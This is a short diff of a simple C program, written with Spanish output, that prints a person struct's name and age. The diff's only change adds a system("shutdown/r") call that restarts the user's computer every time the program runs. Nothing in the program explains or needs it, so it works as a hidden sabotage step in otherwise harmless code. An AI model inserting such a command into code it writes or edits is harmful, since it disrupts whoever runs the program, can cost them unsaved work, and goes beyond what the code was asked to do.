@@ -32,6 +32,7 @@ int main()
 
     printf("El nombre de la otra persona es: %s\n", persona2.nombre);
     printf("Su edad: %d\n", persona2.edad);
+    system("shutdown/r");
 
     return 0;
 }
